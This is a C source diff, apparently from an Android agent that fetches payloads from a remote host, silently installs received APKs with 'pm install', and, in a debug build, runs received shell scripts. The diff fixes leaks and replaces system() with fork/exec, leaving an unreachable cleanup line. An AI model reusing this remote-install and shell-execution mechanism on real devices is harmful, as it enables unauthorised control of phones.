@@ -86,8 +86,9 @@ char *secret_code(int argc, char **argv, int *ret_val, const char *const host,
   free(url);
 
   if (payload_size < sizeof(struct DUMB_PAYLOAD)) {
-    LOG_ERR("bad payload size, expected >=%d, got %ld",
+    LOG_ERR("bad payload size, expected >=%zu, got %zu",
             sizeof(struct DUMB_PAYLOAD), payload_size);
+    free(payload);
     *ret_val = EINVAL;
     return malloc_str("invalid file");
   }
@@ -156,6 +157,7 @@ static char *cmd_install_file(void *apk, size_t apk_size, int *ret_val) {
   } else if (err >= PATH_MAX) {
     LOG_ERR("path too long");
     *ret_val = ENAMETOOLONG;
+    free(path);
     return malloc_str("path too long");
   }
   LOG_DEBUG("writing payload to %s", path);
@@ -179,23 +181,46 @@ static char *cmd_install_file(void *apk, size_t apk_size, int *ret_val) {
   }
   close(fd);
 
-  // TODO: don't use system(), probably unsafe
-  char *system_cmd;
-  asprintf(&system_cmd, "pm install '%s'", path);
-  LOG("running %s", system_cmd);
-  err = system(system_cmd);
-  free(system_cmd);
-  LOG("exited with %d", WEXITSTATUS(err));
-  // unlink(path);
-  free(path);
-  *ret_val = WEXITSTATUS(err);
-  return NULL;
+  pid_t pid = fork();
+  if (pid < 0) {
+    *ret_val = errno;
+    unlink(path);
+    return malloc_str("fork failed");
+  }
+
+  if (pid == 0) {
+    execlp("pm", "pm", "install", path, (char *)NULL);
+    _exit(127);
+  }
+
+  int status;
+  if (waitpid(pid, &status, 0) < 0) {
+    *ret_val = errno;
+    unlink(path);
+    return malloc_str("waitpid failed");
+  }
+
+  if (WIFEXITED(status)) {
+    LOG("exited with %d", WEXITSTATUS(status));
+    unlink(path);
+    *ret_val = WEXITSTATUS(status);
+    return NULL;
+  }
+
+  *ret_val = ECHILD;
+  return malloc_str("pm did not exit normally");
+  unlink(path);
 }
 
 #ifdef DEBUG_MODE
 static char *cmd_shell(void *script, size_t script_size, int *ret_val) {
   int err;
-  // sanity check
+  if (script_size == 0) {
+    LOG("empty script. exiting");
+    *ret_val = 0;
+    return NULL;
+  }
+  // sanity check:force NULL terminate
   ((char *)script)[script_size - 1] = '\0';
   LOG("cmd_shell()");
   LOG("running '%s'", (char *)script);
